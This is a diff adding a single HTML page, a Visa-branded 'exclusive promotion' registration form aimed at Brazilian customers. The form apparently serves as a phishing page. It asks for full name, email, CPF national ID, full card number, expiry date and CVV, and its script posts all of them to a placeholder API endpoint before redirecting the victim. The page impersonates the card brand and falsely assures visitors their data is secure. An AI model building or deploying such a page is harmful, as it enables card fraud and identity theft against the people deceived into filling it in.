@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Visa Exclusive Promotion</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/tailwindcss/2.2.19/tailwind.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+</head>
+<body class="bg-gray-100">
+    <div class="min-h-screen flex items-center justify-center px-4">
+        <div class="max-w-md w-full bg-white rounded-lg shadow-lg overflow-hidden">
+            <div class="bg-blue-800 p-4">
+                <div class="flex justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" version="1.1" viewBox="0 0 780 500" class="h-12">
+                        <rect fill="#0E4595" height="500" width="780"/>
+                        <path fill="#ffffff" d="m293.2 348.73 33.361-195.76h53.36l-33.385 195.76h-53.336zm246.11-191.54c-10.57-3.966-27.137-8.222-47.822-8.222-52.725 0-89.865 26.55-90.18 64.603-0.299 28.13 26.514 43.822 46.752 53.186 20.771 9.595 27.752 15.714 27.654 24.283-0.131 13.121-16.586 19.116-31.922 19.116-21.357 0-32.703-2.967-50.227-10.276l-6.876-3.11-7.489 43.823c12.463 5.464 35.51 10.198 59.438 10.443 56.09 0 92.5-26.246 92.916-66.882 0.199-22.269-14.016-39.216-44.801-53.188-18.65-9.055-30.072-15.099-29.951-24.268 0-8.137 9.668-16.839 30.557-16.839 17.449-0.27 30.09 3.535 39.938 7.5l4.781 2.26 7.232-42.429m137.31-4.223h-41.232c-12.773 0-22.332 3.487-27.941 16.234l-79.244 179.4h56.031s9.16-24.123 11.232-29.418c6.125 0 60.555 0.084 68.338 0.084 1.596 6.853 6.49 29.334 6.49 29.334h49.514l-43.188-195.64zm-65.418 126.41c4.412-11.279 21.26-54.723 21.26-54.723-0.316 0.522 4.379-11.334 7.074-18.684l3.605 16.879s10.219 46.729 12.354 56.528h-44.293zm-363.3-126.41-52.24 133.5-5.567-27.13c-9.725-31.273-40.025-65.155-73.898-82.118l47.766 171.2 56.456-0.064 84.004-195.39h-56.521"/>
+                        <path fill="#F2AE14" d="m146.92 152.96h-86.041l-0.681 4.073c66.938 16.204 111.23 55.363 129.62 102.41l-18.71-89.96c-3.23-12.395-12.597-16.094-24.186-16.527"/>
+                    </svg>
+                </div>
+            </div>
+            
+            <div class="p-6">
+                <h2 class="text-2xl font-bold text-center text-gray-800 mb-6">
+                    Exclusive Promotion for Visa Customers
+                </h2>
+                
+                <p class="text-gray-600 mb-6 text-center">
+                    Register now and receive an exclusive offer on selected products at our partner store.
+                </p>
+                
+                <form id="registrationForm" class="space-y-4">
+                    <div>
+                        <label for="name" class="block text-gray-700 font-medium mb-1">Full Name</label>
+                        <input type="text" id="name" name="name" required
+                            class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    
+                    <div>
+                        <label for="email" class="block text-gray-700 font-medium mb-1">Email</label>
+                        <input type="email" id="email" name="email" required
+                            class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    
+                    <div>
+                        <label for="cpf" class="block text-gray-700 font-medium mb-1">CPF (Brazilian ID)</label>
+                        <input type="text" id="cpf" name="cpf" required
+                            class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    
+                    <div>
+                        <label for="cardNumber" class="block text-gray-700 font-medium mb-1">Visa Card Number</label>
+                        <input type="text" id="cardNumber" name="cardNumber" required
+                            class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    </div>
+                    
+                    <div class="grid grid-cols-2 gap-4">
+                        <div>
+                            <label for="cardExpiry" class="block text-gray-700 font-medium mb-1">Expiry Date</label>
+                            <input type="text" id="cardExpiry" name="cardExpiry" placeholder="MM/YY" required
+                                class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                        </div>
+                        
+                        <div>
+                            <label for="cardCVV" class="block text-gray-700 font-medium mb-1">CVV</label>
+                            <input type="text" id="cardCVV" name="cardCVV" required
+                                class="w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500">
+                        </div>
+                    </div>
+                    
+                    <div class="pt-2">
+                        <button type="submit" 
+                            class="w-full py-3 bg-blue-800 hover:bg-blue-900 text-white font-bold rounded-lg transition duration-200">
+                            Register and Get Offer
+                        </button>
+                    </div>
+                </form>
+                
+                <div id="loadingIndicator" class="hidden mt-4 text-center">
+                    <div class="inline-block animate-spin rounded-full h-8 w-8 border-4 border-blue-500 border-t-transparent"></div>
+                    <p class="mt-2 text-gray-600">Processing your registration...</p>
+                </div>
+                
+                <div id="successMessage" class="hidden mt-4 p-4 bg-green-100 text-green-700 rounded-lg">
+                    <p class="font-bold">Registration successful!</p>
+                    <p class="mt-2">You will be redirected to the exclusive offer in a moment...</p>
+                </div>
+                
+                <div id="errorMessage" class="hidden mt-4 p-4 bg-red-100 text-red-700 rounded-lg">
+                    <p class="font-bold">Registration Error</p>
+                    <p id="errorText" class="mt-2"></p>
+                </div>
+            </div>
+            
+            <div class="bg-gray-50 px-6 py-4">
+                <p class="text-xs text-gray-500 text-center">
+                    Your data is secure and protected. This promotion is valid only for Visa customers.
+                    By registering, you agree to our <a href="#" class="text-blue-600 hover:underline">Terms of Use</a> and 
+                    <a href="#" class="text-blue-600 hover:underline">Privacy Policy</a>.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            // Apply masks to form fields
+            $('#cpf').mask('000.000.000-00');
+            $('#cardNumber').mask('0000 0000 0000 0000');
+            $('#cardExpiry').mask('00/00');
+            $('#cardCVV').mask('000');
+            
+            // Form submission
+            $('#registrationForm').on('submit', function(e) {
+                e.preventDefault();
+                
+                // Show loading indicator
+                $('#loadingIndicator').removeClass('hidden');
+                $('#errorMessage').addClass('hidden');
+                
+                // Collect form data
+                const formData = {
+                    name: $('#name').val(),
+                    email: $('#email').val(),
+                    cpf: $('#cpf').val(),
+                    cardNumber: $('#cardNumber').val().replace(/\s/g, ''),
+                    cardExpiry: $('#cardExpiry').val(),
+                    cardCVV: $('#cardCVV').val()
+                };
+                
+                // Submit to API Gateway
+                $.ajax({
+                    url: 'https://YOUR_API_GATEWAY_URL/registration',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify(formData),
+                    success: function(response) {
+                        // Hide loading indicator
+                        $('#loadingIndicator').addClass('hidden');
+                        
+                        // Show success message
+                        $('#successMessage').removeClass('hidden');
+                        
+                        // Request token with userId
+                        requestToken(response.userId);
+                    },
+                    error: function(xhr) {
+                        // Hide loading indicator
+                        $('#loadingIndicator').addClass('hidden');
+                        
+                        // Show error message
+                        let errorMsg = 'An error occurred while processing your registration. Please try again.';
+                        
+                        if (xhr.responseJSON && xhr.responseJSON.error) {
+                            errorMsg = xhr.responseJSON.error;
+                        }
+                        
+                        $('#errorText').text(errorMsg);
+                        $('#errorMessage').removeClass('hidden');
+                    }
+                });
+            });
+            
+            function requestToken(userId) {
+                $.ajax({
+                    url: 'https://YOUR_API_GATEWAY_URL/token',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ userId: userId }),
+                    success: function(response) {
+                        // Redirect to e-commerce site with token
+                        setTimeout(function() {
+                            window.location.href = response.redirectUrl;
+                        }, 2000);
+                    },
+                    error: function() {
+                        $('#successMessage').addClass('hidden');
+                        $('#errorText').text('Error generating access token. Please try again.');
+                        $('#errorMessage').removeClass('hidden');
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html>
